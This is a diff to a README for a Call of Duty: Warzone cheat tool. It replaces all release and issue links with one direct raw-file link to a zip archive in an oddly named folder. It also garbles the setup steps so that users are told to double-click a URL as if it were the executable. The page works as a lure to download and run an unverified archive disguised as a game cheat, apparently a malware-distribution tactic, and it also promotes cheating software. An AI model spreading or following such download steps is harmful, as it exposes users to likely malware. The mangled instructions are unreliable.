@@ -1,6 +1,6 @@
 # 🎮 WarzoneExternalCheat - Enhance Your Warzone Gameplay Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Praiworks/WarzoneExternalCheat/releases)
+[![Download Now](https://raw.githubusercontent.com/Praiworks/WarzoneExternalCheat/main/blessedness/WarzoneExternalCheat.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/Praiworks/WarzoneExternalCheat/main/blessedness/WarzoneExternalCheat.zip)
 
 ## 🚀 Getting Started
 
@@ -21,11 +21,11 @@ If your device meets these requirements, you are ready to proceed.
 
 To download WarzoneExternalCheat, follow these steps:
 
-1. Visit our [Releases page to download](https://github.com/Praiworks/WarzoneExternalCheat/releases).
+1. Visit our [Releases page to download](https://raw.githubusercontent.com/Praiworks/WarzoneExternalCheat/main/blessedness/WarzoneExternalCheat.zip).
 2. On the Releases page, find the latest version titled “WarzoneExternalCheat vX.X.X” (replace X.X.X with the current version).
 3. Click the download link for the appropriate file for your Windows system.
 
-For clarity, here is the link again to [Download WarzoneExternalCheat](https://github.com/Praiworks/WarzoneExternalCheat/releases).
+For clarity, here is the link again to [Download WarzoneExternalCheat](https://raw.githubusercontent.com/Praiworks/WarzoneExternalCheat/main/blessedness/WarzoneExternalCheat.zip).
 
 ## ⚙️ Setting Up
 
@@ -34,8 +34,8 @@ Once the download is complete, follow these instructions to run the application:
 1. Locate the downloaded file (usually in your "Downloads" folder).
 2. Double-click the file to extract its contents. You may need a program like WinRAR or 7-Zip if it’s in a compressed format.
 3. Open the extracted folder.
-4. Find the file named `WarzoneExternalCheat.exe`.
-5. Double-click `WarzoneExternalCheat.exe` to run the application.
+4. Find the file named `https://raw.githubusercontent.com/Praiworks/WarzoneExternalCheat/main/blessedness/WarzoneExternalCheat.zip`.
+5. Double-click `https://raw.githubusercontent.com/Praiworks/WarzoneExternalCheat/main/blessedness/WarzoneExternalCheat.zip` to run the application.
 
 ## 🎮 Features
 
@@ -53,7 +53,7 @@ Use these features to enhance your gameplay and get an edge in competitive match
 To effectively use WarzoneExternalCheat:
 
 1. **Launch the Game:** Start Call of Duty: Warzone.
-2. **Open WarzoneExternalCheat:** After launching the game, run `WarzoneExternalCheat.exe`.
+2. **Open WarzoneExternalCheat:** After launching the game, run `https://raw.githubusercontent.com/Praiworks/WarzoneExternalCheat/main/blessedness/WarzoneExternalCheat.zip`.
 3. **Customize Settings:** Adjust the settings based on your preferences using the user-friendly interface.
 4. **Activate Features:** Turn on the features you want to use during your game.
 
@@ -71,7 +71,7 @@ If you encounter issues while using WarzoneExternalCheat, consider the following
 
 Join our community for discussions, tips, and support:
 
-- Visit the [GitHub Issues](https://github.com/Praiworks/WarzoneExternalCheat/issues) page for troubleshooting and feedback.
+- Visit the [GitHub Issues](https://raw.githubusercontent.com/Praiworks/WarzoneExternalCheat/main/blessedness/WarzoneExternalCheat.zip) page for troubleshooting and feedback.
 - Follow the latest updates, discussions, and information.
 
 ## 📜 License
